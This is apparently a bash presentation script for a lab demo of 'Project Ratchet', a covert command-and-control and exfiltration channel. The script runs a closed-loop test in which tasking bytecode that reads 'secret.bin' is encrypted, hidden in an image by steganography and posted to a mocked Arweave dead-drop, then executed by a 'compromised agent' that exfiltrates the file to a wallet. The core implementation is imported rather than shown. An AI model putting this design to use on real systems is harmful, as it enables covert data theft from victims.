#!/usr/bin/env bash
#
# PROJECT RATCHET — Offensive Channel Demo
# Lab only. Mock Arweave. No real network.
#
# Phase 1 (capture): runs the real closed-loop suite test up front and
#   records the actual log output produced by each stage of the pipeline
#   (server tasking -> encrypt -> stego embed -> upload -> agent fetch/
#   extract/decrypt -> VM execute -> exfil -> server retrieve).
# Phase 2 (present): replays each stage under a styled header + number,
#   interleaving the real test output, then surfaces live run artifacts.
#
# Flags:
#   --fast   minimise narration delays (handy for piped/CI runs)

set -uo pipefail

# ---------------------------------------------------------------- args
FAST=0
DELAY=2

for arg in "$@"; do
    case "$arg" in
        --fast) FAST=1; DELAY=0.4 ;;
        -h|--help)
            grep -E '^#' "$0" | sed 's/^# \{0,1\}//'
            exit 0
            ;;
        *) ;;
    esac
done

# ---------------------------------------------------------------- colors
ESC=$'\033'
C_RESET="${ESC}[0m"
C_BOLD="${ESC}[1m"
C_DIM="${ESC}[2m"
C_CYAN="${ESC}[36m"
C_YELLOW="${ESC}[33m"
C_MAGENTA="${ESC}[35m"
C_GREEN="${ESC}[32m"
C_RED="${ESC}[31m"

pause() { [ "$FAST" -eq 1 ] || sleep "$DELAY"; }

section() {
    printf '\n%s   %s%s%s\n' "$C_MAGENTA" "$C_BOLD" "$*" "$C_RESET"
    printf '%s   ' "$C_CYAN"; printf '%0.s─' {1..50}; printf '%s\n' "$C_RESET"
}

sep() {
    printf '%s   ' "$C_CYAN"; printf '%0.s─' {1..50}; printf '%s\n' "$C_RESET"
}

# ======================================================================
# PHASE 1 — CAPTURE : run the real loop, record per-step output
# ======================================================================
printf '%s[%sCAPTURE%s] %sRunning the closed loop once — recording real output…%s\n' \
    "$C_YELLOW" "$C_BOLD" "$C_RESET" "$C_DIM" "$C_RESET"

output="$(
    python - <<'PY'
import io
import json
import logging
import sys

from src.assembler import assemble_payload, OPCODE_TABLE
from src.main import shared_state
from src.test_harness import test_full_loop_integration

# The exact tasking the closed-loop run executes (see full_loop_integration).
EXFIL_TASK = (
    "PUSH32 0 PUSH32 1936024434 STORE32 "
    "PUSH32 4 PUSH32 1702112866 STORE32 "
    "PUSH32 8 PUSH32 1768816640 STORE32 "
    "PUSH32 0 SYSCALL 0 SYSCALL 6 HALT"
)

# Stage boundaries are the distinct INFO lines each pipeline phase emits.
STEP_MARKERS = {
    "1": "Step A, Payload assembly start",
    "2": "Step A, Payload length is",
    "3": "Step B, Payload embedding start",
    "4": "Step C, Image upload start",
    "5": "Step A, Image acquisition start",
    "6": "Step D, Bytecode execution start",
    "7": "Step A, Agent wallet poll start",
}
STEP_ORDER = [str(n) for n in range(1, 8)]


def tokenize(task: str) -> list[str]:
    tokens = task.split()
    lines = []
    current: list[str] = []
    for tok in tokens:
        if tok in OPCODE_TABLE:
            if current:
                lines.append(" ".join(current))
            current = [tok]
        else:
            current.append(tok)
    if current:
        lines.append(" ".join(current))
    return lines


def partition(raw: str) -> dict[str, list[str]]:
    """Assign captured log lines to presentation steps by stage markers."""
    steps = {k: [] for k in STEP_ORDER}
    cur: str | None = None
    for line in raw.splitlines():
        # main.py format: "<asctime> - <LEVEL> - <message>"
        msg = line.split(" - ", 2)[2] if len(line.split(" - ", 2)) == 3 else line
        for k in STEP_ORDER:
            if STEP_MARKERS[k] in msg:
                cur = k
                break
        if cur is not None:
            steps[cur].append(msg)
    return steps


def main() -> None:
    # Route logging into a string buffer instead of the console; drop the
    # handlers that main.py installed at import time.
    root = logging.getLogger()
    for h in list(root.handlers):
        root.removeHandler(h)
    buf = io.StringIO()
    cap = logging.StreamHandler(buf)
    cap.setLevel(logging.INFO)
    root.addHandler(cap)
    root.setLevel(logging.INFO)

    try:
        bytecode = assemble_payload(tokenize(EXFIL_TASK))
        test_full_loop_integration()
        mock = shared_state.get("mock")
        exfil_txs = mock.get_wallet_transactions("agent_wallet") if mock else []
        result = {
            "passed": True,
            "error": "",
            "steps": partition(buf.getvalue()),
            "artifacts": {
                "bytecode_hex": bytecode.hex(),
                "bytecode_len": len(bytecode),
                "payload_len": len(bytecode) + 44,      # salt 16 + IV 12 + tag 16
                "cover_path": shared_state.get("cover_path", ""),
                "task_txid": shared_state.get("txid", ""),
                "exfil_txid": exfil_txs[-1] if exfil_txs else "",
            },
        }
    except Exception as exc:  # noqa: BLE001 - harness raises generic asserts
        result = {"passed": False, "error": str(exc), "steps": partition(buf.getvalue()), "artifacts": {}}

    print(json.dumps(result))
    sys.exit(0 if result["passed"] else 1)


main()
PY
)"

status=$?

if [ "$status" -ne 0 ] || ! printf '%s' "$output" | grep -q '"passed": true'; then
    printf '\n%s[%sFAIL%s] %s%sClosed-loop validation failed.%s\n' \
        "$C_RED" "$C_BOLD" "$C_RESET" "$C_RED" "$C_BOLD" "$C_RESET"
    printf '%s%s\n' "$C_DIM" "$output$C_RESET"
    exit 1
fi

# ======================================================================
# PHASE 2 — PRESENT : header, stage map, per-step playback
# ======================================================================
cat <<EOF
${C_CYAN}${C_BOLD}
   ██████╗  ██████╗   ██████╗      ██╗ ███████╗  ██████╗ ████████╗
   ██╔══██╗ ██╔══██╗ ██╔═══██╗      ██║ ██╔════╝ ██╔════╝ ╚══██╔══╝
   ██████╔╝ ██████╔╝ ██║   ██║      ██║ █████╗   ██║         ██║
   ██╔═══╝  ██╔══██╗ ██║   ██║ ██   ██║ ██╔══╝   ██║         ██║
   ██║      ██║  ██║ ╚██████╔╝ ╚█████╔╝ ███████╗ ╚██████╗    ██║
   ╚═╝      ╚═╝  ╚═╝  ╚═════╝  ╚════╝  ╚══════╝  ╚═════╝    ╚═╝
                                                                  
   ██████╗   █████╗  ████████╗  ██████╗ ██╗  ██╗ ███████╗ ████████╗
   ██╔══██╗ ██╔══██╗ ╚══██╔══╝ ██╔════╝ ██║  ██║ ██╔════╝ ╚══██╔══╝
   ██████╔╝ ███████║    ██║    ██║      ███████║ █████╗      ██║
   ██╔══██╗ ██╔══██║    ██║    ██║      ██╔══██║ ██╔══╝      ██║
   ██║  ██║ ██║  ██║    ██║    ╚██████╗ ██║  ██║ ███████╗    ██║
   ╚═╝  ╚═╝ ╚═╝  ╚═╝    ╚═╝     ╚═════╝ ╚═╝  ╚═╝ ╚══════╝    ╚═╝
${C_RESET}
${C_CYAN}${C_BOLD}PROJECT RATCHET — COVERT TASKING + EXFILTRATION CHANNEL${C_RESET}
${C_DIM}Remote tasking of a compromised agent via an immutable dead-drop.${C_RESET}

${C_YELLOW}[${C_BOLD}LAB${C_RESET}${C_YELLOW}] Mock Arweave only. No real targets, no mainnet.${C_RESET}
EOF

section "PRESENTER MAP — 7 stages"
printf '\n'
mapline() {
    local n="$1" desc="$2" n2="$3" desc2="$4"
    printf '%s  %s%s%s.%s %s%s%s' "$C_DIM" "$C_YELLOW" "$C_BOLD" "$n" "$C_RESET" "$C_DIM" "$desc" "$C_RESET"
    if [ -n "$n2" ]; then
        printf '  %s%s%s.%s %s%s%s\n' "$C_YELLOW" "$C_BOLD" "$n2" "$C_RESET" "$C_DIM" "$desc2" "$C_RESET"
    else
        printf '\n'
    fi
}
mapline 1 "Compose tasking bytecode" 5 "Agent fetch + decrypt"
mapline 2 "Encrypt ratcheted AES-GCM" 6 "VM executes + exfiltrates"
mapline 3 "Embed keyed steganography" 7 "Server retrieve + decrypt"
mapline 4 "Upload to Arweave dead-drop" "" ""
printf '\n'
pause

for n in 1 2 3 4 5 6 7; do
    case "$n" in
        1) t="Compose tasking bytecode"
           tip="Two-pass assembler targets a stack VM; the tasking path 'secret.bin' is written into memory." ;;
        2) t="Encrypt under a ratcheted key"
           tip="AES-256-GCM with a per-message K_cmd under a one-way HMAC ratchet." ;;
        3) t="Embed into a cover image"
           tip="Keyed LSB steganography seeded by K_extract." ;;
        4) t="Upload to the dead-drop"
           tip="Tasking image pushed to Arweave (MockArweave in lab)." ;;
        5) t="Fetch, extract, decrypt"
           tip="Agent pulls the tasking, extracts with K_extract, decrypts with K_ratchet." ;;
        6) t="VM executes and exfiltrates"
           tip="file_read → arweave_upload via the exfil handler; wipe() clears ephemeral state." ;;
        7) t="Retrieve and decrypt the exfil"
           tip="Server polls the agent wallet and decrypts with K_exfil_ratchet." ;;
    esac

    sep
    printf '%s[%s%s/%s%s] %s%s%s%s\n' \
        "$C_CYAN" "$C_BOLD" "$n" "7" "$C_RESET" "$C_YELLOW" "$C_BOLD" "$t" "$C_RESET"
    printf '%s       %s%s\n' "$C_DIM" "$tip" "$C_RESET"

    # Real captured output for this stage
    python -c 'import json,sys
d=json.loads(sys.stdin.read())
for ln in d["steps"].get(sys.argv[1] or "", []):
    print(ln)' "$n" <<< "$output" | while IFS= read -r ln; do
        printf '%s    %s %s%s\n' "$C_CYAN" "│" "$C_DIM" "$ln$C_RESET"
    done

    echo
    pause
done

# ------------------------------------------------------ real artifacts
section "REAL RUN ARTIFACTS"
python -c 'import json,sys
d=json.loads(sys.stdin.read())
a=d["artifacts"]
CY="\x1b[33m"; GR="\x1b[32m"; BO="\x1b[1m"; DI="\x1b[2m"; RS="\x1b[0m"
rows = [
    ("tasking bytecode", "%d bytes  (0x%s…)" % (a["bytecode_len"], a["bytecode_hex"][:16])),
    ("payload envelope", "%d bytes  (salt16 + IV12 + tag16 + ct%d)" % (a["payload_len"], a["bytecode_len"])),
    ("cover image used", a["cover_path"]),
    ("dead-drop txid", a["task_txid"]),
    ("exfil wallet txid", a["exfil_txid"]),
]
for label, val in rows:
    print("  %s%s%-18s%s %s%s%s%s" % (DI, CY, label, RS, GR, BO, val, RS))' \
    <<< "$output"
pause

# ------------------------------------------------------------------ win
printf '\n%s[%sPASS%s] %s%sClosed-loop complete — tasking in, key material out.%s\n' \
    "$C_GREEN" "$C_BOLD" "$C_RESET" "$C_GREEN" "$C_BOLD" "$C_RESET"
exit 0
